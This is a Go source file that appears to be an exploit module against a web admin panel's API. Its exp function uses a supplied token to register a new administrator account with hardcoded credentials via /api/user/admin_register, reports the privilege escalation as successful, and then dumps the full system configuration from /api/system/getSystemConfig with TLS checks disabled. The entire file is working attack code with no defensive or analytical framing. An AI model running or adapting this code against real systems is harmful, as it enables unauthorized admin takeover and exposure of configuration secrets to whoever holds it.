package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
)

type RequestBody struct {
	ID          string `json:"ID"`
	CreatedAt   string `json:"CreatedAt"`
	UpdatedAt   string `json:"UpdatedAt"`
	UUID        string `json:"uuid"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	NickName    string `json:"NickName"`
	AuthorityId int    `json:"AuthorityId"`
	Captcha     string `json:"captcha"`
}

type Response2 struct {
	Code int `json:"code"`
	Data struct {
		User struct {
			UserName string `json:"userName"`
			Password string `json:"password"`
		} `json:"user"`
	} `json:"data"`
	Msg string `json:"msg"`
}

type ConfigResponse struct {
	Code int `json:"code"`
	Data struct {
		Config map[string]interface{} `json:"config"`
	} `json:"data"`
	Msg string `json:"msg"`
}

func upgradeAdmin(Info *HostInfo) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	// 创建 GET 请求
	req, err := http.NewRequest("POST", Info.Url+"/api/user/admin_register", nil)
	if err != nil {
		fmt.Println("Error creating POST request:", err)
		return
	}

	// 设置请求头
	req.Header.Set("X-Token", Info.Token)
	req.Header.Set("Accept", "application/json")

	// 发送 GET 请求
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		return
	}
	defer resp.Body.Close()

	// 如果路径存在，发送 POST 请求
	if resp.StatusCode == http.StatusOK {
		body := &RequestBody{
			ID:          "1",
			CreatedAt:   "2023-12-03T09:17:59.622Z",
			UpdatedAt:   "2023-12-03T09:17:59.622Z",
			UUID:        "1",
			Username:    "ggb123456",
			Password:    "ggb123456",
			NickName:    "ggb123456",
			AuthorityId: 888,
			Captcha:     "",
		}
		bodyBytes, err := json.Marshal(body)
		if err != nil {
			fmt.Println("Error marshalling request body:", err)
			return
		}

		// 创建 POST 请求
		req, err = http.NewRequest("POST", Info.Url+"/api/user/admin_register", bytes.NewBuffer(bodyBytes))
		if err != nil {
			fmt.Println("Error creating POST request:", err)
			return
		}

		// 设置请求头
		req.Header.Set("X-Token", Info.Token)
		req.Header.Set("Accept", "application/json")

		// 发送 POST 请求
		resp, err = client.Do(req)
		if err != nil {
			fmt.Println("Error sending POST request:", err)
			return
		}
		defer resp.Body.Close()

		// 解析响应体
		var response2 Response2
		err = json.NewDecoder(resp.Body).Decode(&response2)
		if err != nil {
			fmt.Println("Error decoding response body:", err)
			return
		}
		// 检查 msg 字段
		if response2.Msg == "注册成功" {
			fmt.Println("提权成功")
			fmt.Println("Username:", response2.Data.User.UserName)
			fmt.Println("Password:", "ggb123456") // 密码在响应中没有返回，所以直接打印已知的密码
		} else {
			fmt.Println("Failed to upgrade to admin")
		}
	}
}

func getConfig(Info *HostInfo) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	// 创建 POST 请求
	req, err := http.NewRequest("POST", Info.Url+"/api/system/getSystemConfig", nil)
	if err != nil {
		fmt.Println("Error creating POST request:", err)
	}

	// 设置请求头
	req.Header.Set("X-Token", Info.Token)
	req.Header.Set("Accept", "application/json")

	// 发送 POST 请求
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		return ""
	}
	defer resp.Body.Close()

	// 解析响应体
	var configResponse ConfigResponse
	err = json.NewDecoder(resp.Body).Decode(&configResponse)
	if err != nil {
		fmt.Println("Error decoding response body:", err)
		return ""
	}

	// 格式化输出 config 数据
	jsonData, err := json.MarshalIndent(configResponse.Data.Config, "", "  ")
	if err != nil {
		fmt.Println("Error formatting JSON data:", err)
		return ""
	}
	// 检查 msg 字段
	if configResponse.Msg == "获取成功" {
		fmt.Println("[+] 成功读取系统配置：")
		fmt.Println("-------------------------------------------------------------------------")
		fmt.Println(string(jsonData))
		fmt.Println("-------------------------------------------------------------------------")
		return ""
	} else {
		fmt.Println("Failed to get config")
		return ""
	}
}

func exp(Info *HostInfo) {
	upgradeAdmin(Info)
	getConfig(Info)
}
